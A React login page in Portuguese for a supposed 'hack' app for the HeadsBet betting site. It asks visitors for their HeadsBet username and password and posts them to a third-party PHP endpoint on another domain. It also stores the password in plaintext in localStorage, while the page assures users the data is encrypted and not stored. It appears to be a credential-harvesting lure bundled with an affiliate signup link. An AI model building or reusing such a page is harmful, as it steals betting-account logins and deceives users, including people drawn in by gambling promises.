import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom'; 
import { FiLock, FiCheckCircle, FiUser, FiEye, FiEyeOff } from 'react-icons/fi';
import logo from '../img/logo.png';
import logoBet from '../img/logo-bet.png';

import '../styles/App.css';

function Login() {
  const [usuario, setUsuario] = useState('');
  const [senha, setSenha] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState(''); 
  const [isValidUser, setIsValidUser] = useState(true);

  const navigate = useNavigate();

  useEffect(() => {
    if (usuario.includes('@')) {
      setIsValidUser(false);
      setErrorMessage('Apenas nome de usuário para entrar. O e-mail não funciona.');
    } else {
      setIsValidUser(true);
      setErrorMessage('');
    }
  }, [usuario]);

  const enviarFormulario = async (event) => {
    event.preventDefault();

    const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let newHash = '';
    for (let i = 0; i < 32; i++) {
      const randomIndex = Math.floor(Math.random() * caracteres.length);
      newHash += caracteres.charAt(randomIndex);
    }

    var formdata = new FormData();
    formdata.append("jogo", "sincronizar");
    formdata.append("usuario", usuario);
    formdata.append("senha", senha);
    formdata.append("hash", newHash);

    var requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    const response = await fetch("https://universidadebet.com.br/proxyTest04.php", requestOptions);
    const result = await response.json(); 
    
    if (result.success) {
      localStorage.setItem('serverResponse', JSON.stringify(result));
      localStorage.setItem('usuario', usuario);
      localStorage.setItem('senha', senha);
      
      navigate('/home');
    } else {
      localStorage.removeItem('serverResponse');
      localStorage.removeItem('usuario');
      localStorage.removeItem('senha');
      setErrorMessage('Erro ao fazer login. Tente novamente.');
    }
  };

  return (
    <div className="login-container">
      <form onSubmit={enviarFormulario}>
        <img className="logo" src={logo} width={120} alt="Logo" />
        <h2>Para ter acesso ao hack faça seu login na Heads Bet</h2>
        <div className="input-container">
          <input
            type="text"
            placeholder="Usuário"
            value={usuario}
            onChange={(event) => setUsuario(event.target.value)}
          />
        </div>
        <div className="input-container">
          <div className="password-container">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Senha"
              value={senha}
              onChange={(event) => setSenha(event.target.value)}
            />
            <div 
              className="show-password-button" 
              onClick={() => setShowPassword(!showPassword)}
              onKeyPress={(event) => {
                if (event.key === 'Enter') {
                  event.preventDefault();
                  setShowPassword(!showPassword);
                }
              }}
              tabIndex={0}
            >
              {showPassword ? <FiEyeOff /> : <FiEye />}
            </div>
          </div>
          {errorMessage && <p className="error-message">{errorMessage}</p>} 
        </div>

        <button className="login-button" type="submit" disabled={!isValidUser}>
          <FiCheckCircle className="button-icon" />
          Entrar
        </button>
      </form>
      <div className="security-message">
        <FiLock className="security-icon" />
        <span>
          <strong className="primary">Fique tranquilo!</strong> As informações são encriptadas e não são armazenadas.
        </span>
      </div>
      <div className="register-container">
        <h3 class="green">Passo a passo para ter acesso ao aplicativo</h3>
        <p>
          <strong>1º Esse aplicativo funciona apenas na HeadsBet. Se você ainda não tem cadastro faça agora. Clique abaixo.</strong>
        </p>
        <a 
          href="https://go.aff.arvore.club/0r328atz?campaign_id=4472&source_id=mystery-app" 
          target="_blank" 
          rel="noopener noreferrer" 
          className="register-button"
        >
          Quero fazer meu cadastro na HeadsBet
        </a>
        <div>
        <img className="logo-bet" width={200} src={logoBet} alt="Logo Bet" />
        </div>
        <strong>2º Volte a essa página e use seu usuario e senha para logar no app.</strong>
      </div>
    </div>
  );
}

export default Login;
